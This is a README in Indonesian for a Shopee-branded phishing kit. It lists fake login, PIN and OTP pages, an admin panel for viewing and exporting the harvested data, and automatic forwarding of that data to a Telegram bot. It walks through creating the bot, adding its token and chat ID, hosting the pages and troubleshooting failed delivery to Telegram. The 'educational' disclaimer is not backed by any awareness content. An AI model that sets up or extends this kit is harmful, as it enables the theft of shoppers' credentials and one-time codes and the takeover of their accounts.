# Shopee Security App

Aplikasi simulasi keamanan Shopee untuk tujuan edukasi tentang phishing dan keamanan digital.

## Fitur

- **Halaman Utama**: Landing page dengan tombol konfirmasi
- **Login Simulasi**: Form login palsu untuk demonstrasi
- **PIN Entry**: Input PIN 6 digit
- **OTP Verification**: Verifikasi kode OTP
- **Admin Panel**: Dashboard untuk melihat data yang dikumpulkan
- **Database Telegram**: Data otomatis dikirim ke bot Telegram

## Struktur File

```
client/
├── index.html          # Halaman utama
├── login.html          # Halaman login
├── pin.html           # Halaman input PIN
├── otp.html           # Halaman verifikasi OTP
├── admin.html         # Panel admin
├── config.js          # Konfigurasi Telegram
├── database.js        # Sistem database lokal
├── telegram.html      # Helper untuk kirim data ke Telegram
├── asset/
│   └── shopee.jpg     # Background image
└── api/               # API endpoints (jika diperlukan)
```

## Konfigurasi

1. Edit file `config.js`:
```javascript
const CONFIG = {
    TELEGRAM_BOT_TOKEN: 'YOUR_BOT_TOKEN',
    TELEGRAM_CHAT_ID: 'YOUR_CHAT_ID'
};
```

2. Buat bot Telegram:
   - Chat dengan @BotFather di Telegram
   - Gunakan command `/newbot`
   - Dapatkan token bot
   - Dapatkan chat ID dengan mengirim pesan ke bot dan akses `https://api.telegram.org/botYOUR_TOKEN/getUpdates`

## Cara Menjalankan

### Metode 1: File Lokal
1. Buka `index.html` di browser
2. Navigasi melalui aplikasi

### Metode 2: Server Lokal
1. Jalankan server HTTP:
```bash
python -m http.server 8000
```
2. Buka `http://localhost:8000`

### Metode 3: Live Server (VS Code)
1. Install ekstensi "Live Server"
2. Klik kanan pada `index.html`
3. Pilih "Open with Live Server"

## Admin Panel

Akses admin panel dengan menambahkan `?admin=true` di URL:
- `index.html?admin=true`
- Klik link "Admin Panel" yang muncul di pojok kiri bawah

Fitur admin:
- Lihat statistik pengguna
- Export data ke CSV
- Hapus semua data
- Refresh otomatis setiap 30 detik

## Keamanan Data

- Data disimpan di localStorage browser
- Data otomatis dikirim ke Telegram bot
- Tidak ada data sensitif yang disimpan di server
- Aplikasi hanya untuk tujuan edukasi

## Disclaimer

⚠️ **PENTING**: Aplikasi ini dibuat untuk tujuan edukasi tentang keamanan digital dan awareness phishing. Tidak boleh digunakan untuk tujuan jahat atau merugikan orang lain.

## Teknologi

- HTML5
- CSS3
- Vanilla JavaScript
- Telegram Bot API
- Local Storage

## Browser Support

- Chrome/Chromium
- Firefox
- Safari
- Edge

## Troubleshooting

### Data tidak terkirim ke Telegram
1. Periksa token bot dan chat ID di `config.js`
2. Pastikan bot sudah distart dengan command `/start`
3. Cek console browser untuk error

### Admin panel tidak muncul
1. Pastikan URL mengandung `?admin=true`
2. Refresh halaman
3. Periksa console untuk error JavaScript

### Aplikasi tidak berjalan
1. Pastikan semua file ada di direktori yang sama
2. Gunakan server HTTP (bukan file://)
3. Periksa console browser untuk error

## Lisensi

Aplikasi ini dibuat untuk tujuan edukasi. Gunakan dengan bijak dan bertanggung jawab.